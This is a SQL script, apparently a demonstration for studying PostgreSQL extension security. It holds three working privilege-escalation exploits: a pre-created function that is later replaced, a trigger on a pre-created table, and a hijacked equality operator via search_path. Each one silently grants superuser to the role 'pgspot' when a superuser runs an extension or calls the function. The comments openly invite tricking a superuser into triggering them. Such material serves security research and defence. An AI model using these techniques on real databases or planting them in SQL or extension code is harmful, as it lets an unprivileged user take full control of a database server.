/*
 * Exploit with function pre-creation
 */
CREATE OR REPLACE FUNCTION hello_postgres(text) RETURNS text LANGUAGE SQL AS $$ SELECT 'Hello, Postgres!'; $$;


/*
 * Replace function once extension is installed
 */
CREATE OR REPLACE FUNCTION hello_postgres(lcode text)
RETURNS TEXT 
LANGUAGE plpgsql 
AS $$ 
	DECLARE response_text TEXT;
		    have_super bool;
	BEGIN
		SELECT usesuper INTO have_super FROM pg_user WHERE usename = CURRENT_USER;
		IF have_super THEN
		  ALTER USER pgspot SUPERUSER;
		END IF;

		
		IF NOT EXISTS(SELECT 1 FROM "language" WHERE abbreviation=lcode) THEN 
			RAISE EXCEPTION 'Language code provided is not supported.';
		END IF;
		
		SELECT greeting_text INTO response_text FROM greeting g
			INNER JOIN "language" l ON g.language_id=l.id 
		WHERE abbreviation::text=lcode::text
		ORDER BY random()
		LIMIT 1;
	
	return(response_text);
	END;
$$;


/*
 * Now ask a superuser to look at the sayings! ;-)
 */

SELECT hello_postgres('US');


/*
 * TRIGGER Exploit example
 */
-- Pre-create schema and table
CREATE TABLE "language" (
  id int PRIMARY KEY,  
  abbreviation varchar(100) NOT NULL,
  name text NOT NULL
 );

-- Create a trigger function
CREATE FUNCTION t1_func() RETURNS trigger LANGUAGE PLPGSQL AS $$
BEGIN
  ALTER USER pgspot WITH superuser;
  RETURN NEW;
END; $$;

-- Attach the trigger to the table BEFORE INSERT
CREATE TRIGGER t1 BEFORE INSERT on "language" EXECUTE PROCEDURE t1_func();

/*
 * Now ask a superuser to install the extension! ;-)
 */
--CREATE EXTENSION hello_postgres;

/*
 * Search_path exploit
 */

CREATE FUNCTION hello_eq(varchar,text) RETURNS bool LANGUAGE PLPGSQL AS $$
DECLARE
  have_super bool;
BEGIN
  SELECT usesuper INTO have_super FROM pg_user WHERE usename = CURRENT_USER;
  IF have_super THEN
    ALTER USER pgspot SUPERUSER;
  END IF;
  RETURN $1 OPERATOR(pg_catalog.=) $2;
END; $$;

create operator =(function=hello_eq, leftarg=varchar,rightarg=text);


/*
 * Now ask a superuser to look at the sayings! ;-)
 */

SELECT hello_postgres('US');